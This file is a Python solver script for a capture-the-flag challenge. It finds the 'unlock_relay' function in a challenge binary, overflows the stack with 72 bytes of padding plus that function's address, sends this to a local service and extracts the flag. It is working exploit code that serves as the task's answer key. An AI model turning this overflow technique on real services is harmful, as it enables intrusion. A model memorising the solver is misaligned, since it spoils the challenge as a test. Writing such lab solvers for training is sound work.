#!/usr/bin/env python3
from __future__ import annotations

import os
import re
import socket
import struct
import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / 'attachments' / 'relay.bin'
    nm = subprocess.check_output(['nm', '-an', binary], text=True)
    win = int(next(line.split()[0] for line in nm.splitlines() if ' unlock_relay' in line), 16)
    payload = b'A' * 72 + struct.pack('<Q', win)
    host = os.getenv('HOST', '127.0.0.1')
    port = int(os.getenv('PORT', '8080'))
    with socket.create_connection((host, port), timeout=3) as sock:
        banner = b""
        while b"paste recovery phrase:" not in banner:
            chunk = sock.recv(4096)
            if not chunk:
                break
            banner += chunk
        sock.sendall(payload)
        sock.shutdown(socket.SHUT_WR)
        chunks = [banner]
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
    text = b"".join(chunks).decode('utf-8', errors='ignore')
    match = re.search(r'flag\{[a-zA-Z0-9_\-]+\}', text)
    if not match:
        raise SystemExit('flag not found')
    print(match.group(0))


if __name__ == '__main__':
    main()
